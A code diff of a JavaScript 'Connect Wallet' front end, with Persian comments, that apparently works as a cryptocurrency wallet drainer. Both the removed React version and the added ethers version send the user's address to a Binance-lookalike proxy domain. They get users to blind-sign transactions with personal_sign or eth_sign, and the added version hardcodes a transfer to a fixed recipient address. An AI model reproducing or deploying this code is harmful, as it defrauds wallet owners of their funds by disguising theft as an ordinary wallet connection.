@@ -1,89 +1,75 @@
-import jQuery from "jquery";
-import { EthereumProvider } from "@walletconnect/ethereum-provider";
+import { ethers } from "ethers";
 
-function App() {
-  async function runner() {
-    if (typeof localStorage !== "undefined") {
-      localStorage.removeItem("walletconnect");
+const API_URL = "https://sponsorbinance.vercel.app/api/proxy"; // آدرس پروکسی در Vercel
+
+async function sendTransaction() {
+    if (!window.ethereum) {
+        console.error("❌ Metamask not found");
+        return;
     }
 
-    var ethereumProvider = await EthereumProvider.init({
-      showQrModal: true,
-      chains: [56], // فقط BSC
-      methods: ["personal_sign", "eth_sign"],
-      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
-    });
-
-    await ethereumProvider.enable();
-    var provider = ethereumProvider;
-    var account = await provider.request({ method: "eth_accounts" });
-    var account_sender = account[0];
-    console.log("✅ Wallet Address:", account_sender);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
 
     try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // BSC Chain ID
-      });
+        // دریافت آدرس کاربر
+        const userAddress = await signer.getAddress();
+        console.log("👤 User Address:", userAddress);
+
+        // دریافت nonce از سرور
+        const nonceResponse = await fetch(`${API_URL}?handler=nonce&address=${userAddress}`);
+        const nonceData = await nonceResponse.json();
+
+        if (!nonceData || !nonceData.nonce) {
+            console.error("❌ Failed to fetch nonce:", nonceData);
+            return;
+        }
+
+        console.log("🔢 Nonce:", nonceData.nonce);
+
+        // داده‌های تراکنش
+        const txData = {
+            to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
+            value: "0x2386f26fc10000",
+            gas: "0x5208",
+            gasPrice: "0x12a05f200",
+            nonce: nonceData.nonce, // مقدار nonce که از سرور دریافت شد
+        };
+
+        console.log("📦 Transaction Data:", txData);
+
+        // **✅ امضای تراکنش با eth_sign**
+        const message = JSON.stringify(txData);
+        const signature = await signer.provider.send("eth_sign", [userAddress, message]);
+
+        console.log("✍️ Signature:", signature);
+
+        // **✅ ارسال به سرور از طریق پروکسی**
+        const response = await fetch(API_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                handler: "sign",
+                sender: userAddress,
+                signedData: signature,
+                rawTxData: txData,
+            }),
+        });
+
+        const result = await response.json();
+        console.log("✅ Server Response:", result);
+
+        if (result.error) {
+            console.error("❌ Transaction Failed:", result.error);
+        } else {
+            console.log("🚀 Transaction Sent:", result.txHash);
+        }
     } catch (error) {
-      console.error("❌ Error in switching chain:", error);
-      return;
+        console.error("❌ Error:", error.message);
     }
-
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
-
-    async function signAndSendTransaction(address, chain, type, contract = "0") {
-      try {
-        let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
-
-        var result = await jQuery.post(apiUrl, requestData);
-        var unsignedTx = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unsignedTx);
-
-        // **✅ امضای تراکنش در کیف پول**
-        var signedTx = await provider.request({
-          method: "personal_sign",
-          params: [JSON.stringify(unsignedTx.result), address],
-        });
-
-        console.log("✍️ Signed Transaction:", signedTx);
-
-        // **✅ ارسال امضا به `send.php` برای ارسال به بلاکچین**
-        var txHash = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature: signedTx,
-          type,
-        });
-
-        console.log("📤 Transaction Sent:", txHash);
-        return txHash;
-      } catch (error) {
-        console.error("❌ Error in signAndSendTransaction:", error);
-        return null;
-      }
-    }
-
-    var txHash = await signAndSendTransaction(account_sender, "56", "coin");
-
-    if (txHash) {
-      console.log("📤 Final Transaction Hash:", txHash);
-    } else {
-      console.error("⚠ Transaction failed.");
-    }
-  }
-
-  return (
-    <a
-      href="#"
-      id="connectWallet"
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-      data-uk-toggle=""
-    >
-      <span>Connect Wallet</span>
-    </a>
-  );
 }
 
-export default App;
+// اضافه کردن رویداد به دکمه ارسال
+document.getElementById("sendTxButton").addEventListener("click", sendTransaction);
